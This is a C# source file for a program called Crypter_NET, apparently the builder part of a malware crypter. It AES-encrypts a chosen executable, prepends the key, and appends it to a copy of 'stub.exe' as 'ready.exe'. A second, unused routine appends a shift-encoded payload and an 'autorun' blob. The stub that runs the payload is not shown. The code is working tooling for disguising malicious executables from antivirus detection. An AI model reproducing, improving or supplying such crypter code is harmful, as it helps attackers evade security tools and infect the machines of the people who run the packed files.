using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Crypter_NET
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 1)
            {
                try
                {
                    Crypt(File.ReadAllBytes(args[0]));
                }
                catch (Exception ex)
                {
                    Console.Write(ex.Message + "\r\n\r\n" + ex.StackTrace);
                    Console.ReadKey();
                }
            }
            else
            {
                Console.WriteLine("Add 1 file to comandline parameters");
                Console.ReadKey();
            }
        }

        private static void Crypt(byte[] bytesToEncrypt)
        {
            File.Copy("stub.exe", "ready.exe", true);
            byte[] encryptedBytes = AES_Encrypt(bytesToEncrypt);
            byte[] sizeEncryptedBytes = BitConverter.GetBytes(encryptedBytes.Length);

            FileStream fstream = new FileStream("ready.exe", FileMode.Append);
    
            // Write payload bytes
            fstream.Write(encryptedBytes, 0, encryptedBytes.Length);

            // Write payload size
            fstream.Write(sizeEncryptedBytes, 0, sizeEncryptedBytes.Length);

            fstream.Close();
        }

        private static void Build(string filename)
        {
            File.Copy("stub.exe", "ready.exe", true);

            FileStream fstream = new FileStream("ready.exe", FileMode.Append);

            int shift = new Random().Next(0, 100);

            // Write payload
            byte[] payload = Encrypt(File.ReadAllBytes(filename), shift);
            fstream.Write(payload, 0, payload.Length);

            // Write autorun
            byte[] autorun = Encrypt(File.ReadAllBytes("autorun"), shift);
            fstream.Write(autorun, 0, autorun.Length);

            // Write payload size
            long size = payload.Length;
            byte[] bSize = BitConverter.GetBytes(size);
            fstream.Write(bSize, 0, bSize.Length);

            // Write autorun size
            long autorunSize = autorun.Length;
            byte[] aSize = BitConverter.GetBytes(autorunSize);
            fstream.Write(aSize, 0, aSize.Length);

            // Write shift
            byte[] bShift = BitConverter.GetBytes(shift);
            fstream.Write(bShift, 0, bShift.Length);

            fstream.Close();
        }

        private static byte[] Encrypt(byte[] raw, int offset)
        {
            byte[] result = new byte[raw.Length];

            for (int i = 0; i < raw.Length; i++)
                result[i] = (byte)((int)raw[i] - offset);

            return result;
        }

        public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted)
        {
            byte[] encryptedBytes = null;
            byte[] passwordBytes = new byte[240];
            new Random().NextBytes(passwordBytes);

            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = new byte[passwordBytes.Length + ms.ToArray().Length];
                    passwordBytes.CopyTo(encryptedBytes, 0);
                    ms.ToArray().CopyTo(encryptedBytes, passwordBytes.Length);
                }
            }

            return encryptedBytes;
        }
    }
}
